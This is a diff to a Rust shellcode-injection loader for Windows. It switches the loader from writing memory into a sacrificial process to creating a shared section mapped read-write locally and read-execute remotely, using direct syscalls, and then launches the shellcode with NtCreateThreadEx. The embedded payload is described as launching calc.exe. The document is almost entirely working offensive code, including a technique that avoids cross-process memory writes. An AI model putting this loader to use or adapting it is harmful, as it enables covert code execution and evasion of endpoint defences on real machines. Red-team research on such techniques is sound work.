@@ -31,9 +31,9 @@ use std::ffi::CString;
 use std::mem::zeroed;
 use std::ptr;
 
-use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
+use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS,
+    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, SEC_COMMIT,
 };
 use windows_sys::Win32::System::Threading::{
     CreateProcessA, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
@@ -43,6 +43,8 @@ use windows_sys::Win32::System::Threading::{
 // Ensure syscall.rs is generated next to this file
 mod syscall;
 use syscall::*;
+
+const SECTION_ALL_ACCESS: u32 = 0x000F001F;
 
 // Shellcode generated with ShellSnip (launch calc.exe)
 const SHELLCODE: &[u8] = &[
@@ -68,13 +70,16 @@ const SHELLCODE: &[u8] = &[
 
 unsafe fn execute(name: &str) -> i32 {
     unsafe {
-    let mut op: DWORD = 0;
     let mut oa: OBJECT_ATTRIBUTES = zeroed();
     let mut cid: CLIENT_ID = zeroed();
-    let mut r_ptr: PVOID = ptr::null_mut();
+    let mut s_handle: HANDLE = ptr::null_mut();
     let mut p_handle: HANDLE = ptr::null_mut();
     let mut t_handle: HANDLE = ptr::null_mut();
-    let mut shell_len: SIZE_T = SHELLCODE.len();
+    let mut local_base: PVOID = ptr::null_mut();
+    let mut remote_base: PVOID = ptr::null_mut();
+    let mut section_size: i64 = SHELLCODE.len() as i64;
+    let mut view_size: SIZE_T = SHELLCODE.len();
+    let shell_len: SIZE_T = SHELLCODE.len();
 
     // Create sacrificial process
     let c_name = CString::new(name).unwrap();
@@ -116,33 +121,53 @@ unsafe fn execute(name: &str) -> i32 {
         &mut cid as *mut CLIENT_ID,
     );
 
-    // Allocate memory page to sacrificial process
-    NtAllocateVirtualMemory(
-        p_handle,
-        &mut r_ptr as *mut PVOID as PVOID,
-        0,
-        &mut shell_len as *mut SIZE_T as PSIZE_T,
-        (MEM_COMMIT | MEM_RESERVE) as ULONG,
+    // Create a shared section large enough for shellcode
+    NtCreateSection(
+        &mut s_handle,
+        SECTION_ALL_ACCESS,
+        ptr::null_mut(),
+        &mut section_size as *mut i64 as PLARGE_INTEGER,
         PAGE_EXECUTE_READWRITE as ULONG,
-    );
-
-    // Write shellcode to memory page
-    NtWriteVirtualMemory(
-        p_handle,
-        r_ptr,
-        SHELLCODE.as_ptr() as PVOID,
-        shell_len,
+        SEC_COMMIT as ULONG,
         ptr::null_mut(),
     );
 
-    // Change back memory page permissions
-    NtProtectVirtualMemory(
-        p_handle,
-        &mut r_ptr as *mut PVOID as PVOID,
-        &mut shell_len as *mut SIZE_T as PSIZE_T,
-        PAGE_NOACCESS as ULONG,
-        &mut op as *mut DWORD as PULONG,
+    // Map section as RW in current process (for writing)
+    let current_process = -1isize as HANDLE;
+    view_size = shell_len;
+    NtMapViewOfSection(
+        s_handle,
+        current_process,
+        &mut local_base as *mut PVOID as PVOID,
+        0,
+        shell_len,
+        ptr::null_mut(),
+        &mut view_size as *mut SIZE_T as PSIZE_T,
+        SECTION_INHERIT::ViewShare,
+        0,
+        PAGE_READWRITE as ULONG,
     );
+
+    // Copy shellcode locally (no cross-process write needed)
+    ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), local_base as *mut u8, shell_len);
+
+    // Map same section as RX in target process (for execution)
+    view_size = shell_len;
+    NtMapViewOfSection(
+        s_handle,
+        p_handle,
+        &mut remote_base as *mut PVOID as PVOID,
+        0,
+        shell_len,
+        ptr::null_mut(),
+        &mut view_size as *mut SIZE_T as PSIZE_T,
+        SECTION_INHERIT::ViewShare,
+        0,
+        PAGE_EXECUTE_READ as ULONG,
+    );
+
+    // Unmap local RW view (no longer needed)
+    NtUnmapViewOfSection(current_process, local_base);
 
     // Create main thread of sacrificial process
     NtCreateThreadEx(
@@ -150,7 +175,7 @@ unsafe fn execute(name: &str) -> i32 {
         THREAD_ALL_ACCESS,
         ptr::null_mut(),
         p_handle,
-        r_ptr,           // StartRoutine
+        remote_base,      // StartRoutine
         ptr::null_mut(),  // Argument
         0,                // CreateFlags (FALSE)
         0,                // ZeroBits
@@ -159,19 +184,11 @@ unsafe fn execute(name: &str) -> i32 {
         ptr::null_mut(),  // AttributeList
     );
 
-    // Protect memory page with Execute permission
-    NtProtectVirtualMemory(
-        p_handle,
-        &mut r_ptr as *mut PVOID as PVOID,
-        &mut shell_len as *mut SIZE_T as PSIZE_T,
-        PAGE_EXECUTE as ULONG,
-        &mut op as *mut DWORD as PULONG,
-    );
-
     // Start main thread
     ResumeThread(t_handle);
 
     // Close handles
+    CloseHandle(s_handle);
     CloseHandle(t_handle);
     CloseHandle(p_handle);
 
